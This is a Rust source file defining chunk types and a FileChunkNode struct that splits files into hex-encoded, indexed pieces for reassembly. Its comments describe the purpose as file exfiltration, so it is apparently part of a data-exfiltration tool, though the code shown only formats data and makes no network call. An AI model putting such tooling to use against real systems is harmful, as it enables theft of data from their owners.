/// Categorizes the type of data chunk in a file transmission.
///
/// This enum distinguishes between regular file data chunks and the final chunk marking
/// the end of file transmission. The final chunk is essential for decoders to know when
/// all data has been received and the file can be reconstructed.
///
/// # Variants
/// - `File`: A regular chunk containing file data, not the final chunk
/// - `End`: The final chunk marking the end-of-file, serializes as 'e' instead of 'f'
#[derive(Debug)]
pub enum ChunkType {
    /// A regular file data chunk containing portion of the file.
    File,
    /// The final chunk marking the end of file transmission and data completeness.
    End,
}

impl Default for ChunkType {
    /// Default chunk type is File.
    fn default() -> Self {
        ChunkType::File
    }
}

/// File data chunk node for exfiltration of a file portion.
///
/// A FileChunkNode represents a single chunk of file data along with all metadata
/// necessary for proper reconstruction. Each chunk knows:
/// - Which file it belongs to (via the root node identifier)
/// - Its position in the file (sequential index starting at 1)
/// - The actual chunk data (hex-encoded for safe transmission)
/// - Whether this is the final chunk (End marker)
///
/// Multiple FileChunkNode instances are created per file, one for each chunk.
/// They are transmitted in order (typically, though the index allows out-of-order reception)
/// and reassembled by decoders using the root identifier and index.
///
/// # Internal Encoding
/// - File data is stored as hex strings internally for safe transmission
/// - Root node ID is stored as hex to match serialized format
/// - Index is serialized in hexadecimal (uppercase) in the output format
#[derive(Debug, Default)]
pub struct FileChunkNode {
    /// Hexadecimal representation of the 4-byte root node identifier.
    /// Links this chunk to its parent file (matches the identifier in RootNode).
    pub root_node_id: String,
    /// The sequential index of this chunk within the file (1-based).
    /// Used for proper reassembly of chunks during file reconstruction.
    pub index: usize,
    /// The file data for this chunk, stored as a hex-encoded string.
    /// Internal representation only; decoded during transmission encoding.
    data: String,
    /// The type of this chunk (File or End marker).
    /// Decoders use this to determine when all chunks have been received.
    chunk_type: ChunkType,
}

impl FileChunkNode {
    /// Creates a new FileChunkNode with the specified metadata and data.
    ///
    /// # Arguments
    /// * `root_node_id` - The root node identifier linking this chunk to the file.
    /// * `index` - The sequential index of this chunk.
    /// * `data` - The file data bytes for this chunk.
    ///
    /// # Returns
    /// A new FileChunkNode instance.
    pub fn new(root_node_id: std::rc::Rc<[u8; 4]>, index: usize, data: Vec<u8>) -> Self {
        Self {
            root_node_id: hex::encode(*root_node_id),
            index,
            data: hex::encode(data),
            chunk_type: ChunkType::File,
        }
    }

    /// Appends additional data to this chunk.
    ///
    /// # Arguments
    /// * `more_data` - Additional file data bytes to append.
    pub fn extend_data(&mut self, more_data: Vec<u8>) {
        self.data.push_str(hex::encode(more_data).as_str());
    }

    /// Marks this chunk as the final chunk of the file.
    pub fn set_last_chunk(&mut self) {
        self.chunk_type = ChunkType::End;
    }

    /// Sets the chunk index and returns self for method chaining.
    ///
    /// # Arguments
    /// * `index` - The new chunk index.
    ///
    /// # Returns
    /// Self for fluent API usage.
    pub fn set_index(mut self, index: usize) -> Self {
        self.index = index;

        self
    }

    /// Sets the root node identifier and returns self for method chaining.
    ///
    /// # Arguments
    /// * `root_node_id` - The raw root node identifier bytes.
    ///
    /// # Returns
    /// Self for fluent API usage.
    pub fn set_raw_root_node_id(mut self, root_node_id: std::rc::Rc<[u8; 4]>) -> Self {
        self.root_node_id = hex::encode(*root_node_id);

        self
    }

    /// Returns the node type character identifier for this chunk.
    ///
    /// # Returns
    /// 'f' for a regular file chunk, 'e' for the final end chunk.
    pub fn node_type(&self) -> char {
        match self.chunk_type {
            ChunkType::File => 'f',
            ChunkType::End => 'e',
        }
    }
}

impl std::fmt::Display for FileChunkNode {
    /// Formats the FileChunkNode as a string in the format: `type:rootid:index:hexdata`
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}:{}:{:X}:{}",
            self.node_type(),
            self.root_node_id,
            self.index,
            self.data,
        )
    }
}
